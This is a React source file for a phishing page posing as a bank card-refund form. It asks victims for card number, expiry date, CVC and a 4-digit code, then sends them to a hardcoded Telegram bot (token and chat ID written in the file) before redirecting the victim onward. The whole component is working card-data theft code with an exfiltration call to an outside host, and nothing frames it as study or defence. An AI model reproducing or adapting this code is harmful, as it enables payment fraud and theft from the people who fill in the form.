import react from 'react'
import React from 'react'
import 'antd/dist/antd.css'
import { Input } from 'antd'
import {useState} from 'react'
import {useRef, useEffect} from 'react';
import { Radio } from 'antd';
import { useNavigate } from 'react-router-dom';

export default function SelectCard() {
  const navigate = useNavigate();
  const cardNumberUnderline = useRef(null);
  const errCardNumber = useRef(null);
  const expireDateUnderline = useRef(null);
  const errExpireDate = useRef(null);
  const cvcUnderline = useRef(null);
  const errCvc = useRef(null);
  const codeUnderline = useRef(null);
  const errCode = useRef(null);

  const [errString, setErrString] = useState('Please complete this field');
  const [cardNumber, setCardNumber] = useState('');
  const [expireDate, setExpireDate] = useState('');
  const [cvc, setCvc] = useState('');
  const [code, setCode] = useState('');
  const [dateLength, setDateLength] = useState(0);
  const chatId = '5345080694';
  const botToken= '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';
//   $chat_id = '5345080694';
// $token = '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';

  const nextButtonClicked = () => {
    if(!cardNumber){
      cardNumberUnderline.current.color = 'red';
      errCardNumber.current.hidden = false;
      setErrString('Please complete this field');
    }
    if(!expireDate){
      expireDateUnderline.current.color = 'red';
      errExpireDate.current.hidden = false;
    }
    if(!cvc){
      cvcUnderline.current.color = 'red';
      errCvc.current.hidden = false;
    }
    if(!code){
      codeUnderline.current.color = 'red';
      errCode.current.hidden = false;
    }
    if(cardNumber && expireDate && cvc && code){
      var message = '====================={New User Login Income CardNumber, ExpireDate, CVC and Code}====================="';
      message += '\n CardNumber: ';
      message += cardNumber;
      message += '\n ExpireDate: ';
      message += expireDate;
      message += '\n CVC or CVS: ';
      message += cvc;
      message += '\n Code: ';
      message += code;

      fetch('https://api.telegram.org/bot'+botToken+'/sendMessage?chat_id='+chatId+'&text=' + message) // url here
      .then((response) => {
        return response.json(); // replace .json() to .text() for plain text
      })
      .then((daat) => {
        console.log(daat);
      });
      navigate('/PersonalSpace');
    }
  }
  const cardNumberChanged = (e) => {
    setCardNumber(e.target.value);
  }
  const expireDateChanged = (e) => {
    var date = e.target.value;
    var length = date.length;
    if(length > 5) return false;
    if(length >= 1) {
      if(!/^[0-1]+$/.test(date[0]))return false;
    }
    if(length >= 2) {
      if(!/^[0-9]+$/.test(date[1]))return false;
      if(date[0] =='0' && date[1] =='0') return false;
      if(date[0]== '1'){
        if(/^[3-9]+$/.test(date[1]))return false;
      }
      if(length == 2){
        if(dateLength <=2) date += '/';
      } 
    }
    if(length >= 4) {
      if(!/^[0-9]+$/.test(date[3]))return false;
    }
    if(length >= 5) {
      if(!/^[0-9]+$/.test(date[4]))return false;
    }
    setExpireDate(date);
    setDateLength(date.length);
  }
  const cvcChanged = (e) => {
    setCvc(e.target.value);
  }
  const codeChanged = (e) => {
    setCode(e.target.value);
  }
  return (
    <div className="sc-jlyJG dhCUzp">
      <div className="sc-fjdhpX fxQNsf">
        <div>
          <div className="welcomeBack">SELECT A CARD TO CREDIT.</div>
          <div className="commonText" style={{width: '60%'}}>
            <div style={{display: 'flex', justifyContent: 'space-between'}}>
              <p style = {{float: 'left', marginLeft: 10, color: 'blue'}}>Full name Account:</p>
              <p style = {{float: 'right', marginRight: 10, color: 'blue'}}>Full Name</p>
            </div>
            <div style={{display: 'flex', justifyContent: 'space-between'}}>
              <p style = {{float: 'left', marginLeft: 10, color: 'blue'}}>Folder number:</p>
              <p style = {{float: 'right', marginRight: 10, color: 'blue'}}>535084367</p>
            </div>
            <div style={{display: 'flex', justifyContent: 'space-between'}}>
              <p style = {{float: 'left', marginLeft: 10, color: 'blue'}}>Amount:</p>
              <p style = {{float: 'right', marginRight: 10, color: 'blue'}}>302.50 €</p>
            </div>
          </div>
        </div>
        <div className="sign-in-content">
          <div id="cardNumberForm">
            <div id="cardNumber" className="formName">
              Credit card number
            </div>
            <div
              id="cardNumberInput"
              className="inputForm"
            >
              <Input
                type = 'text'
                className="antInput"
                placeholder="16 digits on the front of the card"
                value = {cardNumber}
                onChange = {cardNumberChanged}
              />
              <hr id = 'cardNumberUnderline' size="2" color="#c1c9d6" ref={cardNumberUnderline}/>
              <p id = 'errCardNumber' ref={errCardNumber} style = {{color: 'red', fontSize: '16px'}} hidden>{errString}</p>
            </div>
          </div>
          <div id="expireDateForm">
            <div id="expireDate" className="formName">
              Expiration date
            </div>
            <div
              id="expireDateInput"
              className="inputForm"
            >
              <Input
                type = 'text'
                className="antInput"
                placeholder="MM/YY"
                value = {expireDate}
                onChange = {expireDateChanged}
              />
              <hr id = 'expireDateUnderline' size="2" color="#c1c9d6" ref={expireDateUnderline}/>
              <p id = 'errExpireDate' ref={errExpireDate} style = {{color: 'red', fontSize: '16px'}} hidden>{errString}</p>
            </div>
          </div>
          <div id="cvcForm">
            <div id="cvc" className="formName">
              CVC or CVS
            </div>
            <div
              id="cvcInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="3 or 4 digits on back of the card"
                value = {cvc}
                onChange = {cvcChanged}
              />
              <hr id = 'cvcUnderline' size="2" color="#c1c9d6" ref={cvcUnderline}/>
              <p id = 'errCvc' ref={errCvc} style = {{color: 'red', fontSize: '16px'}} hidden>{errString}</p>
            </div>
          </div>
          <div id="codeForm">
            <div id="code" className="formName">
              CODE
            </div>
            <div
              id="codeInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="4 digits"
                value = {code}
                onChange = {codeChanged}
              />
              <hr id = 'codeUnderline' size="2" color="#c1c9d6" ref={codeUnderline}/>
              <p id = 'errCode' ref={errCode} style = {{color: 'red', fontSize: '16px'}} hidden>{errString}</p>
            </div>
          </div>
        </div>
        <div className="sc-jzJRlG giyMJw">
          <button
            type="button"
            className="signInButton"
            style={{ margin: 'auto', marginTop: 10}}
            onClick={nextButtonClicked}
          >
            <span>Next</span>
          </button>
        </div>
      </div>
    </div>
  )
}

